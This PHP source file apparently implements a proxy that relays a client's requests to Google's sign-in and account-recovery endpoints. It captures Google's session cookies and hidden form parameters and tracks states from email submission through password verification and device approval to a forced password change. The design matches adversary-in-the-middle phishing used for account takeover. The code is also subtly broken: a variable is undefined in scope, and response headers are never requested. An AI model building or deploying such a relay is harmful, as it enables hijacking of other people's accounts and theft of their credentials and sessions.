<?php
require_once 'config.php';
require_once 'session.php';
require_once 'auth.php';

class GoogleProxy {
    private $session;
    private $auth;
    
    public function __construct() {
        $this->session = RecoverySession::getInstance();
        $this->auth = new AuthManager();
    }
    
    public function handleRequest() {
        // Validate request
        $this->auth->validateRequest();
        
        $method = $_SERVER['REQUEST_METHOD'];
        $endpoint = $_GET['endpoint'] ?? '';
        
        switch ($method) {
            case 'GET':
                return $this->handleGet($endpoint);
            case 'POST':
                return $this->handlePost($endpoint);
            default:
                $this->auth->jsonResponse(['error' => 'Method not allowed'], 405);
        }
    }
    
    private function handleGet($endpoint) {
        $params = $_GET;
        unset($params['endpoint']);
        
        $url = GOOGLE_BASE_URL . $endpoint;
        if (!empty($params)) {
            $url .= '?' . http_build_query($params);
        }
        
        return $this->makeRequest($url, 'GET');
    }
    
    private function handlePost($endpoint) {
        $data = $this->auth->getRequestData();
        $params = $_GET;
        unset($params['endpoint']);
        
        $url = GOOGLE_BASE_URL . $endpoint;
        if (!empty($params)) {
            $url .= '?' . http_build_query($params);
        }
        
        return $this->makeRequest($url, 'POST', $data);
    }
    
    private function makeRequest($url, $method = 'GET', $data = null) {
        $ch = curl_init();
        
        // Set URL
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_MAXREDIRS, 5);
        curl_setopt($ch, CURLOPT_TIMEOUT, 30);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);
        
        // Set headers
        $headers = [
            'User-Agent: ' . USER_AGENT,
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
            'Accept-Encoding: gzip, deflate, br',
            'Connection: keep-alive',
            'Cache-Control: no-cache',
            'Pragma: no-cache',
            'Upgrade-Insecure-Requests: 1',
            'Sec-Fetch-Dest: document',
            'Sec-Fetch-Mode: navigate',
            'Sec-Fetch-Site: same-origin',
            'Sec-Fetch-User: ?1'
        ];
        
        // Add session cookies
        $cookies = $this->session->get('cookies', []);
        if (!empty($cookies)) {
            $cookieString = implode('; ', array_map(
                function($k, $v) { return "$k=$v"; },
                array_keys($cookies),
                $cookies
            ));
            $headers[] = 'Cookie: ' . $cookieString;
        }
        
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        
        // Handle POST data
        if ($method === 'POST' && $data) {
            curl_setopt($ch, CURLOPT_POST, true);
            
            if (is_array($data)) {
                $postData = http_build_query($data);
                curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
                $headers[] = 'Content-Type: application/x-www-form-urlencoded';
            } else {
                curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
            }
            
            curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        }
        
        // Get response
        $response = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $error = curl_error($ch);
        
        // Get response headers
        $headerSize = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
        $responseHeaders = substr($response, 0, $headerSize);
        $body = substr($response, $headerSize);
        
        curl_close($ch);
        
        if ($error) {
            logEvent("CURL Error: $error - URL: $url", 'ERROR');
            return [
                'success' => false,
                'error' => $error,
                'status' => $httpCode
            ];
        }
        
        // Extract cookies from response
        $newCookies = $this->extractCookies($responseHeaders);
        if (!empty($newCookies)) {
            $this->session->updateCookies($newCookies);
        }
        
        // Extract parameters from response
        $params = $this->extractParams($body);
        if (!empty($params)) {
            $this->session->updateParams($params);
        }
        
        // Update session state based on endpoint
        $this->updateSessionState($endpoint);
        
        logEvent("Request successful: $url - Status: $httpCode", 'INFO');
        
        return [
            'success' => true,
            'status' => $httpCode,
            'headers' => $this->parseHeaders($responseHeaders),
            'body' => $body,
            'params' => $params,
            'cookies' => $newCookies
        ];
    }
    
    private function extractCookies($headers) {
        $cookies = [];
        $lines = explode("\n", $headers);
        
        foreach ($lines as $line) {
            if (stripos($line, 'set-cookie:') === 0) {
                $cookie = trim(substr($line, 11));
                $parts = explode(';', $cookie);
                $cookiePart = trim($parts[0]);
                
                if (strpos($cookiePart, '=') !== false) {
                    list($name, $value) = explode('=', $cookiePart, 2);
                    $cookies[$name] = $value;
                }
            }
        }
        
        return $cookies;
    }
    
    private function extractParams($html) {
        $params = [];
        
        // Extract TL parameter
        if (preg_match('/TL=([A-Za-z0-9_-]+)/', $html, $matches)) {
            $params['TL'] = $matches[1];
        }
        
        // Extract hidden fields
        if (preg_match_all('/<input[^>]*type=["\']hidden["\'][^>]*name=["\']([^"\']+)["\'][^>]*value=["\']([^"\']*)["\'][^>]*>/i', $html, $matches, PREG_SET_ORDER)) {
            foreach ($matches as $match) {
                $params[$match[1]] = $match[2];
            }
        }
        
        // Extract URL parameters
        if (preg_match_all('/[?&]([^=&#]+)=([^&#]*)/', $html, $matches, PREG_SET_ORDER)) {
            foreach ($matches as $match) {
                $params[urldecode($match[1])] = urldecode($match[2]);
            }
        }
        
        return $params;
    }
    
    private function parseHeaders($headers) {
        $parsed = [];
        $lines = explode("\n", trim($headers));
        
        foreach ($lines as $line) {
            if (strpos($line, ':') !== false) {
                list($key, $value) = explode(':', $line, 2);
                $parsed[trim($key)] = trim($value);
            }
        }
        
        return $parsed;
    }
    
    private function updateSessionState($endpoint) {
        $stateMap = [
            '/v3/signin/recoveryidentifier' => 'email_submitted',
            '/v3/signin/challenge/pwd' => 'password_verified',
            '/v3/signin/challenge/dp' => 'device_approval_requested',
            '/v3/signin/speedbump/changepassword/changepasswordnudge' => 'nudge_loaded',
            '/v3/signin/speedbump/changepassword/changepasswordform' => 'password_changed'
        ];
        
        if (isset($stateMap[$endpoint])) {
            $this->session->setState($stateMap[$endpoint]);
            
            if ($endpoint === '/v3/signin/challenge/dp') {
                $this->session->set('device_approval.requested', true);
                $this->session->set('device_approval.notification_sent', true);
            }
        }
    }
}

// Handle the request
$proxy = new GoogleProxy();
$result = $proxy->handleRequest();

// Return JSON response
header('Content-Type: application/json');
echo json_encode($result);
?>